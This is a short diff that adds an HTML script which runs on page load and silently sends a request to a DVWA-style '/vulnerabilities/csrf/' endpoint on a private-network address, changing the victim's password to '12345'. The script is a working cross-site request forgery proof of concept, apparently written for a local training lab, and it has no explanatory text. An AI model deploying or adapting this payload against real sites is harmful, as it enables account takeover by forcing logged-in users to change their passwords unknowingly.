@@ -1,0 +1,21 @@
+<script>
+  const data = {
+    password_new: "12345",
+    password_conf: "12345",
+    Change: "Change",
+  };
+  const Param = new URLSearchParams(data).toString();
+  async function changePassword() {
+    try {
+      const response = await fetch(
+        `http://192.168.231.132:8080/vulnerabilities/csrf/?${Param}`,
+      );
+      if (response.ok) {
+        console.log("Thanh cong");
+      }
+    } catch (error) {
+      console.error(error);
+    }
+  }
+  changePassword();
+</script>
